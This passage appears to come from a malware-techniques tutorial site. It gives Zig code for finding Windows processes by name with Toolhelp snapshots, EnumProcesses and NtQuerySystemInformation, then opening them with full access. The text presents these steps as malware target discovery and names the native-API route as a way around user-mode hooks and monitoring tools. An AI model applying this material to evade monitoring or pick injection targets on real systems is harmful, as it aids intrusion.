function)\nfn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !DWORD {\n    const wide_process_name = try convertToWideString(allocator, process_name);\n    defer allocator.free(wide_process_name);\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snapshot == INVALID_HANDLE_VALUE) {\n        print(\"[!] CreateToolhelp32Snapshot Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.SnapshotFailed;\n    }\n    defer _ = CloseHandle(snapshot);\n\n    var process_entry = std.mem.zeroes(PROCESSENTRY32W);\n    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);\n\n    if (Process32FirstW(snapshot, &amp;process_entry) == 0) {\n        print(\"[!] Process32FirstW Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.ProcessEnumFailed;\n    }\n\n    while (true) {\n        // Find the length of the executable name (null-terminated)\n        var exe_name_len: usize = 0;\n        while (exe_name_len &lt; process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {\n            exe_name_len += 1;\n        }\n\n        const exe_name = process_entry.szExeFile[0..exe_name_len];\n\n        // Compare process names (case-insensitive)\n        if (compareWideStringsIgnoreCase(exe_name, wide_process_name[0 .. wide_process_name.len - 1])) { // -1 to exclude null terminator\n            return process_entry.th32ProcessID;\n        }\n\n        if (Process32NextW(snapshot, &amp;process_entry) == 0) {\n            break;\n        }\n    }\n\n    print(\"[!] Process is Not Found \\n\", .{});\n    return error.ProcessNotFound;\n}\n\n// Enhanced version that returns ProcessResult (PID + Handle)\nfn getRemoteProcessHandle(allocator: std.mem.Allocator, process_name: []const u8) !?ProcessResult {\n    const pid = getRemoteProcessPid(allocator, process_name) catch |err| {\n        switch (err) {\n            error.ProcessNotFound =&gt; return null,\n            else =&gt; return err,\n        }\n    };\n\n    const handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid) orelse {\n        print(\"[!] OpenProcess failed for PID: {} with error: {d}\\n\", .{ pid, GetLastError() });\n        return null;\n    };\n\n    return ProcessResult{\n        .pid = pid,\n        .handle = handle,\n    };\n}\n\n// Wait for user input\nfn waitForInput() !void {\n    print(\"[#] Press Enter to exit...\\n\", .{});\n    const stdin = std.io.getStdIn().reader();\n    _ = try stdin.readByte();\n}\n\n// Main function demonstrating both approaches\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // Get remote process handle (equivalent to Rust's match statement)\n    if (try getRemoteProcessHandle(allocator, TARGET_PROCESS)) |result| {\n        defer result.deinit();\n\n        print(\"[+] Found process {s} with PID: {}\\n\", .{ TARGET_PROCESS, result.pid });\n    } else {\n        print(\"[!] Could not find process {s}\\n\", .{TARGET_PROCESS});\n    }\n\n    try waitForInput();\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/enum_processes/","title":"Using EnumProcesses","text":""},{"location":"Advanced-Malware-Techniques/Process-Enumeration/enum_processes/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>The <code>EnumProcesses</code> API from PSAPI retrieves an array of process identifiers for all running processes. By iterating over these IDs and opening each process, we can list loaded modules and gather details such as executable names. Malware uses this enumeration step to discover potential targets or detect analysis tools. This example shows how to request the process list, extract module information, and display the results for later decision making.</p>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/enum_processes/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst WINAPI = windows.WINAPI;\n\n// Windows API constants and types\nconst DWORD = windows.DWORD;\nconst HANDLE = windows.HANDLE;\nconst BOOL = windows.BOOL;\nconst LPCWSTR = windows.LPCWSTR;\nconst HMODULE = windows.HMODULE;\nconst MAX_PATH = windows.MAX_PATH;\n\n// Define a UTF-8 to UTF-16 string converter\nconst W = std.unicode.utf8ToUtf16LeStringLiteral;\n\n// Process access rights\nconst PROCESS_ALL_ACCESS = 0x001F0FFF;\nconst PROCESS_QUERY_INFORMATION = 0x0400;\nconst PROCESS_VM_READ = 0x0010;\n\n// External Windows API functions\nextern \"psapi\" fn EnumProcesses(lpidProcess: [*]DWORD, cb: DWORD, lpcbNeeded: *DWORD) callconv(WINAPI) BOOL;\nextern \"psapi\" fn EnumProcessModules(hProcess: HANDLE, lphModule: *HMODULE, cb: DWORD, lpcbNeeded: *DWORD) callconv(WINAPI) BOOL;\nextern \"psapi\" fn GetModuleBaseNameW(hProcess: HANDLE, hModule: HMODULE, lpBaseName: [*]u16, nSize: DWORD) callconv(WINAPI) DWORD;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;\nextern \"kernel32\" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) DWORD;\n\nconst ProcessInfo = struct {\n    pid: DWORD,\n    handle: HANDLE,\n};\n\nfn getRemoteProcessHandle(allocator: std.mem.Allocator, proc_name: []const u16) !?ProcessInfo {\n    _ = allocator; // suppress unused parameter warning\n    var processes: [1024 * 2]DWORD = undefined;\n    var return_len: DWORD = 0;\n    var return_len2: DWORD = 0;\n\n    // Get the array of PIDs in the system\n    if (EnumProcesses(&amp;processes, @sizeOf(@TypeOf(processes)), &amp;return_len) == 0) {\n        std.debug.print(\"[!] EnumProcesses Failed With Error: {}\\n\", .{GetLastError()});\n        return null;\n    }\n\n    // Calculate the number of elements in the array returned\n    const number_of_pids = return_len / @sizeOf(DWORD);\n    std.debug.print(\"[i] Number Of Processes Detected: {}\\n\", .{number_of_pids});\n\n    for (0..number_of_pids) |i| {\n        // If process PID is not NULL\n        if (processes[i] != 0) {\n            // Open a process handle\n            if (OpenProcess(PROCESS_ALL_ACCESS, 0, processes[i])) |h_process| {\n                var h_module: HMODULE = undefined;\n\n                // If handle is valid\n                // Get a handle of a module in the process\n                // The module handle is needed for `GetModuleBaseNameW`\n                if (EnumProcessModules(h_process, &amp;h_module, @sizeOf(HMODULE), &amp;return_len2) != 0) {\n                    var proc_name_buffer: [MAX_PATH]u16 = undefined;\n\n                    // Get the name of the process\n                    if (GetModuleBaseNameW(h_process, h_module, &amp;proc_name_buffer, proc_name_buffer.len) != 0) {\n                        // Find the null terminator\n                        var name_len: usize = 0;\n                        for (proc_name_buffer) |char| {\n                            if (char == 0) break;\n                            name_len += 1;\n                        }\n\n                        // Compare process names\n                        if (std.mem.eql(u16, proc_name, proc_name_buffer[0..name_len])) {\n                            return ProcessInfo{\n                                .pid = processes[i],\n                                .handle = h_process,\n                            };\n                        }\n                    } else {\n                        std.debug.print(\"[!] GetModuleBaseName Failed [At Pid: {}] With Error: {}\\n\", .{ processes[i], GetLastError() });\n                    }\n                } else {\n                    std.debug.print(\"[!] EnumProcessModules Failed [At Pid: {}] With Error: {}\\n\", .{ processes[i], GetLastError() });\n                }\n\n                _ = CloseHandle(h_process);\n            }\n        }\n    }\n\n    return null;\n}\n\nfn printProcesses() !void {\n    var processes: [1024 * 2]DWORD = undefined;\n    var return_len: DWORD = 0;\n    var return_len2: DWORD = 0;\n\n    // Get the array of PIDs in the system\n    if (EnumProcesses(&amp;processes, @sizeOf(@TypeOf(processes)), &amp;return_len) == 0) {\n        std.debug.print(\"[!] EnumProcesses Failed With Error: {}\\n\", .{GetLastError()});\n        return;\n    }\n\n    // Calculate the number of elements in the array returned\n    const number_of_pids = return_len / @sizeOf(DWORD);\n    std.debug.print(\"[i] Number Of Processes Detected: {}\\n\", .{number_of_pids});\n\n    for (0..number_of_pids) |i| {\n        if (processes[i] != 0) {\n            // Open a process handle with limited access\n            if (OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, processes[i])) |h_process| {\n                var h_module: HMODULE = undefined;\n\n                // Get a handle of a module in the process\n                if (EnumProcessModules(h_process, &amp;h_module, @sizeOf(HMODULE), &amp;return_len2) != 0) {\n                    var proc_name_buffer: [MAX_PATH]u16 = undefined;\n\n                    // Get the name of the process\n                    if (GetModuleBaseNameW(h_process, h_module, &amp;proc_name_buffer, proc_name_buffer.len) != 0) {\n                        // Find the null terminator\n                        var name_len: usize = 0;\n                        for (proc_name_buffer) |char| {\n                            if (char == 0) break;\n                            name_len += 1;\n                        }\n\n                        // Convert UTF-16 to UTF-8 for printing\n                        var utf8_name: [MAX_PATH * 2]u8 = undefined;\n                        if (std.unicode.utf16LeToUtf8(&amp;utf8_name, proc_name_buffer[0..name_len])) |utf8_len| {\n                            std.debug.print(\"[{:0&gt;3}] Process \\\"{s}\\\" - Of Pid: {}\\n\", .{ i, utf8_name[0..utf8_len], processes[i] });\n                        } else |_| {\n                            std.debug.print(\"[{:0&gt;3}] Process [encoding error] - Of Pid: {}\\n\", .{ i, processes[i] });\n                        }\n                    } else {\n                        std.debug.print(\"[!] GetModuleBaseName Failed [At Pid: {}] With Error: {}\\n\", .{ processes[i], GetLastError() });\n                    }\n                } else {\n                    std.debug.print(\"[!] EnumProcessModules Failed [At Pid: {}] With Error: {}\\n\", .{ processes[i], GetLastError() });\n                }\n\n                _ = CloseHandle(h_process);\n            }\n        }\n    }\n}\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // Define target process name as UTF-16 array\n    const target_name = W(\"svchost.exe\");\n\n    if (getRemoteProcessHandle(allocator, target_name)) |maybe_process_info| {\n        if (maybe_process_info) |process_info| {\n            var utf8_name: [MAX_PATH * 2]u8 = undefined;\n            if (std.unicode.utf16LeToUtf8(&amp;utf8_name, target_name)) |utf8_len| {\n                std.debug.print(\"[+] FOUND \\\"{s}\\\" - Of Pid: {}\\n\", .{ utf8_name[0..utf8_len], process_info.pid });\n            } else |_| {\n                std.debug.print(\"[+] FOUND [encoding error] - Of Pid: {}\\n\", .{process_info.pid});\n            }\n\n            // Don't forget to close the handle\n            _ = CloseHandle(process_info.handle);\n        } else {\n            std.debug.print(\"[!] Target process not found\\n\", .{});\n            return;\n        }\n    } else |err| {\n        std.debug.print(\"[!] Error occurred: {}\\n\", .{err});\n        return;\n    }\n\n    // NOTE: Uncomment this to print all processes\n    // try printProcesses();\n\n    std.debug.print(\"[#] Press &lt;Enter&gt; To Quit ... \", .{});\n    const stdin = std.io.getStdIn().reader();\n    _ = try stdin.readByte();\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/nt_query_system_information/","title":"Using NtQuerySystemInformation","text":""},{"location":"Advanced-Malware-Techniques/Process-Enumeration/nt_query_system_information/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p><code>NtQuerySystemInformation</code> is a native function exported by <code>ntdll.dll</code> that can return extensive system data, including the list of running processes. Because it operates at a lower level than <code>EnumProcesses</code>, it is sometimes used by attackers to avoid user\u2011mode hooks placed on higher level APIs. The example code invokes this function with the <code>SystemProcessInformation</code> class and manually parses the returned structures to enumerate processes. This method grants access to detailed information and can bypass certain monitoring tools that expect the PSAPI techniques.</p>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/nt_query_system_information/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\nconst windows_structs = @import(\"./windows_structs.zig\");\n\n// Windows API types\nconst DWORD = windows.DWORD;\nconst HANDLE = windows.HANDLE;\nconst BOOL = windows.BOOL;\nconst ULONG = windows.ULONG;\nconst NTSTATUS = windows.NTSTATUS;\nconst PVOID = ?*anyopaque;\nconst USHORT = windows.USHORT;\nconst PWSTR = windows.PWSTR;\nconst SIZE_T = windows.SIZE_T;\nconst LPCWSTR = windows.LPCWSTR;\nconst HMODULE = windows.HMODULE;\nconst WINAPI = windows.WINAPI;\n\n// Configuration\nconst TARGET_PROCESS = \"notepad.exe\";\n\n// Convert UTF-8 to UTF-16 at compile time\nconst W = std.unicode.utf8ToUtf16LeStringLiteral;\n\nconst UNICODE_STRING = windows_structs.UNICODE_STRING;\n\nconst SYSTEM_INFORMATION_CLASS = windows_structs.SYSTEM_INFORMATION_CLASS;\n\nconst SYSTEM_PROCESS_INFORMATION = windows_structs.SYSTEM_PROCESS_INFORMATION;\n\n// Function pointer type for NtQuerySystemInformation\nconst NtQuerySystemInformationFn = *const fn (\n    SystemInformationClass: SYSTEM_INFORMATION_CLASS,\n    SystemInformation: PVOID,\n    SystemInformationLength: ULONG,\n    ReturnLength: ?*ULONG,\n) callconv(WINAPI) NTSTATUS;\n\n// ProcessResult structure (equivalent to Rust's Option&lt;(u32, HANDLE)&gt;)\nconst ProcessResult = struct {\n    pid: DWORD,\n    handle: HANDLE,\n\n    pub fn deinit(self: ProcessResult) void {\n        _ = CloseHandle(self.handle);\n    }\n};\n\n// External function declarations\nextern \"kernel32\" fn GetProcAddress(hModule: HMODULE, lpProcName: [*:0]const u8) callconv(WINAPI) PVOID;\nextern \"kernel32\" fn GetModuleHandleW(lpModuleName: LPCWSTR) callconv(WINAPI) ?HMODULE;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;\nextern \"kernel32\" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) DWORD;\nextern \"kernel32\" fn HeapAlloc(hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T) callconv(WINAPI) PVOID;\nextern \"kernel32\" fn HeapFree(hHeap: HANDLE, dwFlags: DWORD, lpMem: PVOID) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetProcessHeap() callconv(WINAPI) HANDLE;\n\n// Constants\nconst PROCESS_ALL_ACCESS = 0x001F0FFF;\nconst HEAP_ZERO_MEMORY = 0x00000008;\nconst STATUS_SUCCESS: NTSTATUS = windows.NTSTATUS.SUCCESS;\n\n// Helper function to convert UNICODE_STRING to Zig slice\nfn unicodeStringToSlice(unicode_str: UNICODE_STRING) []u16 {\n    if (unicode_str.Buffer == null or unicode_str.Length == 0) {\n        return &amp;[_]u16{};\n    }\n    return @as([*]u16, @ptrCast(unicode_str.Buffer))[0 .. unicode_str.Length / 2];\n}\n\n// Helper function to convert string to lowercase\nfn toLowercase(allocator: std.mem.Allocator, input: []const u8) ![]u8 {\n    var result = try allocator.alloc(u8, input.len);\n    for (input, 0..) |char, i| {\n        result[i] = std.ascii.toLower(char);\n    }\n    return result;\n}\n\n// Function to get remote process handle using dynamic loading (equivalent to Rust function)\nfn getRemoteProcessHandle(allocator: std.mem.Allocator, process_name: []const u8) ?ProcessResult {\n    // Load NtQuerySystemInformation dynamically\n    const ntdll = GetModuleHandleW(W(\"ntdll.dll\")) orelse {\n        print(\"[!] GetModuleHandleW failed!\\n\", .{});\n        return null;\n    };\n\n    const nt_query_proc = GetProcAddress(ntdll, \"NtQuerySystemInformation\") orelse {\n        print(\"[!] GetProcAddress failed!\\n\", .{});\n        return null;\n    };\n\n    // Cast to function pointer (equivalent to Rust's transmute)\n    const nt_query_sys_info = @as(NtQuerySystemInformationFn, @ptrCast(nt_query_proc));\n\n    var return_length: ULONG = 0;\n\n    // First call to get buffer size\n    _ = nt_query_sys_info(.SystemProcessInformation, null, 0, &amp;return_length);\n\n    if (return_length == 0) {\n        print(\"[!] Failed to get buffer size.\\n\", .{});\n        return null;\n    }\n\n    // Allocate buffer (equivalent to Rust's HeapAlloc)\n    const heap = GetProcessHeap();\n    const proc_info_ptr = HeapAlloc(heap, HEAP_ZERO_MEMORY, return_length) orelse {\n        print(\"[!] HeapAlloc failed!\\n\", .{});\n        return null;\n    };\n    defer _ = HeapFree(heap, 0, proc_info_ptr);\n\n    // Second call to get actual data\n    const status = nt_query_sys_info(\n        .SystemProcessInformation,\n        proc_info_ptr,\n        return_length,\n        &amp;return_length,\n    );\n\n    if (status != STATUS_SUCCESS) {\n        print(\"[!] NtQuerySystemInformation failed!\\n\", .{});\n        return null;\n    }\n\n    // Convert target process name to lowercase for comparison\n    const target_lower = toLowercase(allocator, process_name) catch {\n        print(\"[!] Memory allocation failed for target name.\\n\", .{});\n        return null;\n    };\n    defer allocator.free(target_lower);\n\n    // Iterate through processes (equivalent to Rust's loop)\n    var proc_info = @as(*SYSTEM_PROCESS_INFORMATION, @ptrCast(@alignCast(proc_info_ptr)));\n\n    while (true) {\n        // Get process name from UNICODE_STRING\n        const image_name_ptr = proc_info.ImageName.Buffer;\n        const process_id = @as(DWORD, @intCast(@intFromPtr(proc_info.UniqueProcessId)));\n\n        if (image_name_ptr != null and proc_info.ImageName.Length &gt; 0) {\n            // Convert Unicode string to UTF-8 (equivalent to Rust's OsString::from_wide)\n            const wide_chars = unicodeStringToSlice(proc_info.ImageName);\n\n            // Convert UTF-16 to UTF-8\n            var utf8_buffer: [260]u8 = undefined;\n            if (std.unicode.utf16LeToUtf8(&amp;utf8_buffer, wide_chars)) |utf8_len| {\n                const process_name_str = utf8_buffer[0..utf8_len];\n\n                // Convert to lowercase for comparison (equivalent to Rust's to_lowercase())\n                const process_lower = toLowercase(allocator, process_name_str) catch continue;\n                defer allocator.free(process_lower);\n\n                // Compare process names (case-insensitive, equivalent to Rust comparison)\n                if (std.mem.eql(u8, process_lower, target_lower)) {\n                    const handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) orelse {\n                        print(\"[!] OpenProcess failed for PID: {}\\n\", .{process_id});\n                        continue;\n                    };\n\n                    return ProcessResult{\n                        .pid = process_id,\n                        .handle = handle,\n                    };\n                }\n            } else |_| {\n                // Skip processes with encoding errors\n                continue;\n            }\n        }\n\n        // Move to next process (equivalent to Rust's pointer arithmetic)\n        if (proc_info.NextEntryOffset == 0) {\n            break;\n        }\n\n        proc_info = @as(*SYSTEM_PROCESS_INFORMATION, @ptrCast(@alignCast(@as([*]u8, @ptrCast(proc_info)) + proc_info.NextEntryOffset)));\n    }\n\n    return null;\n}\n\n// Wait for user input (equivalent to Rust's stdin().read_line())\nfn waitForInput() !void {\n    print(\"[#] Press Enter to exit...\\n\", .{});\n    const stdin = std.io.getStdIn().reader();\n    _ = try stdin.readByte();\n}\n\n// Main function (equivalent to Rust's main)\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // Get remote process handle (equivalent to Rust's match statement)\n    if (getRemoteProcessHandle(allocator, TARGET_PROCESS)) |result| {\n        defer result.deinit();\n\n        print(\"[+] Found process {s} with PID: {}\\n\", .{ TARGET_PROCESS, result.pid });\n    } else {\n        print(\"[!] Could not find process {s}\\n\", .{TARGET_PROCESS});\n    }\n\n    try waitForInput();\n}\n</code></pre> windows_structs.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\n\n// Re-export Windows types\npub const USHORT = windows.USHORT;\npub const ULONG = windows.ULONG;\npub const ULONGLONG = windows.ULONGLONG;\npub const HANDLE = windows.HANDLE;\npub const SIZE_T = windows.SIZE_T;\npub const ULONG_PTR = windows.ULONG_PTR;\npub const LARGE_INTEGER = windows.LARGE_INTEGER;\npub const LONG = windows.LONG;\n\npub const UNICODE_STRING = extern struct {\n    Length: USHORT,\n    MaximumLength: USHORT,\n    Buffer: ?[*:0]u16, // PWSTR in Zig (made optional for null checking)\n};\n\n// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntexapi.h#L1324\npub const SYSTEM_INFORMATION_CLASS = enum(c_int) {\n    SystemBasicInformation, // q: SYSTEM_BASIC_INFORMATION\n    SystemProcessorInformation, // q: SYSTEM_PROCESSOR_INFORMATION\n    SystemPerformanceInformation, // q: SYSTEM_PERFORMANCE_INFORMATION\n    SystemTimeOfDayInformation, // q: SYSTEM_TIMEOFDAY_INFORMATION\n    SystemPathInformation, // not implemented\n    SystemProcessInformation, // q: SYSTEM_PROCESS_INFORMATION\n    SystemCallCountInformation, // q: SYSTEM_CALL_COUNT_INFORMATION\n    SystemDeviceInformation, // q: SYSTEM_DEVICE_INFORMATION\n    SystemProcessorPerformanceInformation, // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION (EX in: USHORT ProcessorGroup)\n    SystemFlagsInformation, // q: SYSTEM_FLAGS_INFORMATION\n    SystemCallTimeInformation, // not implemented // SYSTEM_CALL_TIME_INFORMATION // 10\n    SystemModuleInformation, // q: RTL_PROCESS_MODULES\n    SystemLocksInformation, // q: RTL_PROCESS_LOCKS\n    SystemStackTraceInformation, // q: RTL_PROCESS_BACKTRACES\n    SystemPagedPoolInformation, // not implemented\n    SystemNonPagedPoolInformation, // not implemented\n    SystemHandleInformation, // q: SYSTEM_HANDLE_INFORMATION\n    SystemObjectInformation, // q: SYSTEM_OBJECTTYPE_INFORMATION mixed with SYSTEM_OBJECT_INFORMATION\n    SystemPageFileInformation, // q: SYSTEM_PAGEFILE_INFORMATION\n    SystemVdmInstemulInformation, // q: SYSTEM_VDM_INSTEMUL_INFO\n    SystemVdmBopInformation, // not implemented // 20\n    SystemFileCacheInformation, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemCache)\n    SystemPoolTagInformation, // q: SYSTEM_POOLTAG_INFORMATION\n    SystemInterruptInformation, // q: SYSTEM_INTERRUPT_INFORMATION (EX in: USHORT ProcessorGroup)\n    SystemDpcBehaviorInformation, // q: SYSTEM_DPC_BEHAVIOR_INFORMATION; s: SYSTEM_DPC_BEHAVIOR_INFORMATION (requires SeLoadDriverPrivilege)\n    SystemFullMemoryInformation, // not implemented // SYSTEM_MEMORY_USAGE_INFORMATION\n    SystemLoadGdiDriverInformation, // s (kernel-mode only)\n    SystemUnloadGdiDriverInformation, // s (kernel-mode only)\n    SystemTimeAdjustmentInformation, // q: SYSTEM_QUERY_TIME_ADJUST_INFORMATION; s: SYSTEM_SET_TIME_ADJUST_INFORMATION (requires SeSystemtimePrivilege)\n    SystemSummaryMemoryInformation, // not implemented // SYSTEM_MEMORY_USAGE_INFORMATION\n    SystemMirrorMemoryInformation, // s (requires license value \"Kernel-MemoryMirroringSupported\") (requires SeShutdownPrivilege) // 30\n    SystemPerformanceTraceInformation, // q; s: (type depends on EVENT_TRACE_INFORMATION_CLASS)\n    SystemObsolete0, // not implemented\n    SystemExceptionInformation, // q: SYSTEM_EXCEPTION_INFORMATION\n    SystemCrashDumpStateInformation, // s: SYSTEM_CRASH_DUMP_STATE_INFORMATION (requires SeDebugPrivilege)\n    SystemKernelDebuggerInformation, // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION\n    SystemContextSwitchInformation, // q: SYSTEM_CONTEXT_SWITCH_INFORMATION\n    SystemRegistryQuotaInformation, // q: SYSTEM_REGISTRY_QUOTA_INFORMATION; s (requires SeIncreaseQuotaPrivilege)\n    SystemExtendServiceTableInformation, // s (requires SeLoadDriverPrivilege) // loads win32k only\n    SystemPrioritySeperation, // s (requires SeTcbPrivilege)\n    SystemVerifierAddDriverInformation, // s (requires SeDebugPrivilege) // 40\n    SystemVerifierRemoveDriverInformation, // s (requires SeDebugPrivilege)\n    SystemProcessorIdleInformation, // q: SYSTEM_PROCESSOR_IDLE_INFORMATION (EX in: USHORT ProcessorGroup)\n    SystemLegacyDriverInformation, // q: SYSTEM_LEGACY_DRIVER_INFORMATION\n    SystemCurrentTimeZoneInformation, // q; s: RTL_TIME_ZONE_INFORMATION\n    SystemLookasideInformation, // q: SYSTEM_LOOKASIDE_INFORMATION\n    SystemTimeSlipNotification, // s: HANDLE (NtCreateEvent) (requires SeSystemtimePrivilege)\n    SystemSessionCreate, // not implemented\n    SystemSessionDetach, // not implemented\n    SystemSessionInformation, // not implemented (SYSTEM_SESSION_INFORMATION)\n    SystemRangeStartInformation, // q: SYSTEM_RANGE_START_INFORMATION // 50\n    SystemVerifierInformation, // q: SYSTEM_VERIFIER_INFORMATION; s (requires SeDebugPrivilege)\n    SystemVerifierThunkExtend, // s (kernel-mode only)\n    SystemSessionProcessInformation, // q: SYSTEM_SESSION_PROCESS_INFORMATION\n    SystemLoadGdiDriverInSystemSpace, // s: SYSTEM_GDI_DRIVER_INFORMATION (kernel-mode only) (same as SystemLoadGdiDriverInformation)\n    SystemNumaProcessorMap, // q: SYSTEM_NUMA_INFORMATION\n    SystemPrefetcherInformation, // q; s: PREFETCHER_INFORMATION // PfSnQueryPrefetcherInformation\n    SystemExtendedProcessInformation, // q: SYSTEM_PROCESS_INFORMATION\n    SystemRecommendedSharedDataAlignment, // q: ULONG // KeGetRecommendedSharedDataAlignment\n    SystemComPlusPackage, // q; s: ULONG\n    SystemNumaAvailableMemory, // q: SYSTEM_NUMA_INFORMATION // 60\n    SystemProcessorPowerInformation, // q: SYSTEM_PROCESSOR_POWER_INFORMATION (EX in: USHORT ProcessorGroup)\n    SystemEmulationBasicInformation, // q: SYSTEM_BASIC_INFORMATION\n    SystemEmulationProcessorInformation, // q: SYSTEM_PROCESSOR_INFORMATION\n    SystemExtendedHandleInformation, // q: SYSTEM_HANDLE_INFORMATION_EX\n    SystemLostDelayedWriteInformation, // q: ULONG\n    SystemBigPoolInformation, // q: SYSTEM_BIGPOOL_INFORMATION\n    SystemSessionPoolTagInformation, // q: SYSTEM_SESSION_POOLTAG_INFORMATION\n    SystemSessionMappedViewInformation, // q: SYSTEM_SESSION_MAPPED_VIEW_INFORMATION\n    SystemHotpatchInformation, // q; s: SYSTEM_HOTPATCH_CODE_INFORMATION\n    SystemObjectSecurityMode, // q: ULONG // 70\n    SystemWatchdogTimerHandler, // s: SYSTEM_WATCHDOG_HANDLER_INFORMATION // (kernel-mode only)\n    SystemWatchdogTimerInformation, // q: SYSTEM_WATCHDOG_TIMER_INFORMATION // (kernel-mode only)\n    SystemLogicalProcessorInformation, // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION (EX in: USHORT ProcessorGroup)\n    SystemWow64SharedInformationObsolete, // not implemented\n    SystemRegisterFirmwareTableInformationHandler, // s: SYSTEM_FIRMWARE_TABLE_HANDLER // (kernel-mode only)\n    SystemFirmwareTableInformation, // SYSTEM_FIRMWARE_TABLE_INFORMATION\n    SystemModuleInformationEx, // q: RTL_PROCESS_MODULE_INFORMATION_EX\n    SystemVerifierTriageInformation, // not implemented\n    SystemSuperfetchInformation, // q; s: SUPERFETCH_INFORMATION // PfQuerySuperfetchInformation\n    SystemMemoryListInformation, // q: SYSTEM_MEMORY_LIST_INFORMATION; s: SYSTEM_MEMORY_LIST_COMMAND (requires SeProfileSingleProcessPrivilege) // 80\n    SystemFileCacheInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (same as SystemFileCacheInformation)\n    SystemThreadPriorityClientIdInformation, // s: SYSTEM_THREAD_CID_PRIORITY_INFORMATION (requires SeIncreaseBasePriorityPrivilege)\n    SystemProcessorIdleCycleTimeInformation, // q: SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup)\n    SystemVerifierCancellationInformation, // SYSTEM_VERIFIER_CANCELLATION_INFORMATION // name:wow64:whNT32QuerySystemVerifierCancellationInformation\n    SystemProcessorPowerInformationEx, // not implemented\n    SystemRefTraceInformation, // q; s: SYSTEM_REF_TRACE_INFORMATION // ObQueryRefTraceInformation\n    SystemSpecialPoolInformation, // q; s: SYSTEM_SPECIAL_POOL_INFORMATION (requires SeDebugPrivilege) // MmSpecialPoolTag, then MmSpecialPoolCatchOverruns != 0\n    SystemProcessIdInformation, // q: SYSTEM_PROCESS_ID_INFORMATION\n    SystemErrorPortInformation, // s (requires SeTcbPrivilege)\n    SystemBootEnvironmentInformation, // q: SYSTEM_BOOT_ENVIRONMENT_INFORMATION // 90\n    SystemHypervisorInformation, // q: SYSTEM_HYPERVISOR_QUERY_INFORMATION\n    SystemVerifierInformationEx, // q; s: SYSTEM_VERIFIER_INFORMATION_EX\n    SystemTimeZoneInformation, // q; s: RTL_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)\n    SystemImageFileExecutionOptionsInformation, // s: SYSTEM_IMAGE_FILE_EXECUTION_OPTIONS_INFORMATION (requires SeTcbPrivilege)\n    SystemCoverageInformation, // q: COVERAGE_MODULES s: COVERAGE_MODULE_REQUEST // ExpCovQueryInformation (requires SeDebugPrivilege)\n    SystemPrefetchPatchInformation, // SYSTEM_PREFETCH_PATCH_INFORMATION\n    SystemVerifierFaultsInformation, // s: SYSTEM_VERIFIER_FAULTS_INFORMATION (requires SeDebugPrivilege)\n    SystemSystemPartitionInformation, // q: SYSTEM_SYSTEM_PARTITION_INFORMATION\n    SystemSystemDiskInformation, // q: SYSTEM_SYSTEM_DISK_INFORMATION\n    SystemProcessorPerformanceDistribution, // q: SYSTEM_PROCESSOR_PERFORMANCE_DISTRIBUTION (EX in: USHORT ProcessorGroup) // 100\n    SystemNumaProximityNodeInformation, // q; s: SYSTEM_NUMA_PROXIMITY_MAP\n    SystemDynamicTimeZoneInformation, // q; s: RTL_DYNAMIC_TIME_ZONE_INFORMATION (requires SeTimeZonePrivilege)\n    SystemCodeIntegrityInformation, // q: SYSTEM_CODEINTEGRITY_INFORMATION // SeCodeIntegrityQueryInformation\n    SystemProcessorMicrocodeUpdateInformation, // s: SYSTEM_PROCESSOR_MICROCODE_UPDATE_INFORMATION\n    SystemProcessorBrandString, // q: CHAR[] // HaliQuerySystemInformation -&gt; HalpGetProcessorBrandString, info class 23\n    SystemVirtualAddressInformation, // q: SYSTEM_VA_LIST_INFORMATION[]; s: SYSTEM_VA_LIST_INFORMATION[] (requires SeIncreaseQuotaPrivilege) // MmQuerySystemVaInformation\n    